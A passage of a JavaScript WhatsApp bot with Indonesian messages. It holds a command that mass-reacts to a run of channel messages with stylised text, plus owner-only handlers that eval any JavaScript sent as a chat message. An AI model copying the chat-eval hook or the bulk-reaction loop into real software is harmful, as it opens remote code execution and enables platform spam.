    a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
    h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
    o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
    v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
    '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
    '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒'
  };

  try {
    const [mainText, offsetStr] = text.split('|');
    const args = mainText.trim().split(" ");
    const link = args[0];

    if (!/^https:\/\/whatsapp\.com\/channel\//.test(link)) return kontolreply("Link tautan tidak valid");

    let parts = link.split('/');
    let channelId = parts[4];
    let rawMessageId = parts[5];

    if (!channelId || !rawMessageId) return reply("Link tautan tidak lengkap!");

    const offset = parseInt(offsetStr?.trim()) || 1;
    const teksNormal = args.slice(1).join(' ');
    const teksTanpaLink = teksNormal.replace(link, '').trim();

    if (!teksTanpaLink) return reply("Masukkan teks/emoji untuk di react.");

    const emoji = teksTanpaLink.toLowerCase().split('').map(c => {
      if (c === ' ') return '―';
      return hurufGaya[c] || c;
    }).join('');

    let res = await sock.newsletterMetadata("invite", channelId);

    let success = 0, failed = 0;
    for (let i = 0; i < offset; i++) {
      const msgId = (parseInt(rawMessageId) - i).toString();
      try {
        await sock.newsletterReactMessage(res.id, msgId, emoji);
        success++;
      } catch (e) {
        console.error(`Gagal reaction ke pesan ID ${msgId}:`, e);
        failed++;
      }
    }

    reply(`Berhasil mengirim reaction *${emoji}* ke ${success} pesan di channel *${res.name}*\nGagal di ${failed} pesan`);
  } catch (e) {
    console.error(e);
    reply("Gagal memproses permintaan!");
  }
}
break;
break;
default:
if (budy.startsWith('>')) {
if (!isOwner) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isOwner) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});
